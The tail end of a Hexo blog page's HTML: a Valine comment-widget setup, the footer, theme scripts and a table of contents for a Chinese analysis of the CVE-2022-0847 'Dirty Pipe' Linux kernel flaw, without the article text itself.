                new Valine({
                    el: '#vcomments',
                    appId: 'oP8c99sduOuJjyeVoKafuweh-gzGzoHsz',
                    appKey: 'TwXXvHbKxF0DVsXV22S2uRVG',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '欢迎大家吐槽~',
                    lang: 'en'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = 'fa1lr4in';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">fa1lr4in</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E7%BC%96%E8%AF%91"><span class="nav-text">一、linux内核调试环境编译</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E6%BA%90%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="nav-text">1、源码获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91"><span class="nav-text">2、内核编译</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E5%8A%A0%E8%BD%BD%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F"><span class="nav-text">3、加载文件系统镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E5%90%AF%E5%8A%A8qemu"><span class="nav-text">4、启动qemu</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81gdb%E8%B0%83%E8%AF%95"><span class="nav-text">5、gdb调试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E3%80%81%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%E3%80%81%E7%AE%A1%E9%81%93"><span class="nav-text">二、标准输入输出、输入输出重定向、管道</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA"><span class="nav-text">1、标准输入输出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">2、输入输出重定向</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E7%AE%A1%E9%81%93"><span class="nav-text">3、管道</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E7%AE%A1%E9%81%93%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-text">三、管道源代码实现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">0、前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81pipe-%E4%B8%8E-pipe2"><span class="nav-text">1、pipe() 与 pipe2()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81do-pipe2"><span class="nav-text">2、do_pipe2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81-do-pipe-flags"><span class="nav-text">3、__do_pipe_flags</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81create-pipe-files"><span class="nav-text">4、create_pipe_files</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81get-pipe-inode"><span class="nav-text">5、get_pipe_inode()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%E3%80%81struct-pipe-inode-info"><span class="nav-text">6、struct pipe_inode_info</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7%E3%80%81struct-pipe-buffer"><span class="nav-text">7、struct pipe_buffer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8%E3%80%81alloc-pipe-info"><span class="nav-text">8、alloc_pipe_info</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9%E3%80%81struct-file-operations-pipefifo-fops"><span class="nav-text">9、struct file_operations pipefifo_fops</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10%E3%80%81pipe-write"><span class="nav-text">10、pipe_write</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81DMA-copy"><span class="nav-text">四、DMA copy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E9%9B%B6%E6%8B%B7%E8%B4%9D"><span class="nav-text">五、零拷贝</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E4%BC%A0%E7%BB%9F%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-text">1、传统的文件传输</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81mmap-write"><span class="nav-text">2、mmap + write</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81sendfile"><span class="nav-text">3、sendfile</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81splice"><span class="nav-text">4、splice</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-text">5、总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AD%E3%80%81splice-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-text">六、splice 系统调用源代码实现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0%E3%80%81%E5%89%8D%E8%A8%80-1"><span class="nav-text">0、前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81splice"><span class="nav-text">1、splice</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81-do-splice"><span class="nav-text">2、__do_splice</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81do-splice"><span class="nav-text">3、do_splice</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81do-splice-to"><span class="nav-text">4、do_splice_to</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81f-op-gt-splice-read"><span class="nav-text">5、f_op-&gt;splice_read</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%E3%80%81generic-file-splice-read"><span class="nav-text">6、generic_file_splice_read</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7%E3%80%81call-read-iter-amp-f-op-gt-read-iter"><span class="nav-text">7、call_read_iter &amp; f_op-&gt;read_iter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8%E3%80%81ext4-file-read-iter"><span class="nav-text">8、ext4_file_read_iter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9%E3%80%81generic-file-read-iter"><span class="nav-text">9、generic_file_read_iter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10%E3%80%81generic-file-buffered-read"><span class="nav-text">10、generic_file_buffered_read</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11%E3%80%81copy-page-to-iter"><span class="nav-text">11、copy_page_to_iter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12%E3%80%81copy-page-to-iter-pipe"><span class="nav-text">12、copy_page_to_iter_pipe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%83%E3%80%81page-cache"><span class="nav-text">七、page cache</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E5%A6%82%E6%9E%9C%E7%A8%8B%E5%BA%8Fcrash%EF%BC%8C%E5%BC%82%E6%AD%A5%E6%A8%A1%E5%BC%8F%E4%BC%9A%E4%B8%A2%E5%A4%B1%E6%95%B0%E6%8D%AE%E5%90%97%EF%BC%9F"><span class="nav-text">1、如果程序crash，异步模式会丢失数据吗？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%8D%A0%E7%94%A8page-cache%E6%83%85%E5%86%B5"><span class="nav-text">2、查看一个文件占用page cache情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E4%B8%80%E4%BA%9B%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="nav-text">3、一些注意点</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9B%B6%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">零、前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-text">一、补丁分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81splice%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E5%AE%9E%E9%AA%8C"><span class="nav-text">二、splice读写文件实验</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-text">三、动态分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81exp%E5%88%86%E6%9E%90"><span class="nav-text">四、exp分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-text">五、总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>




<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
    
</div>



</body>
</html>
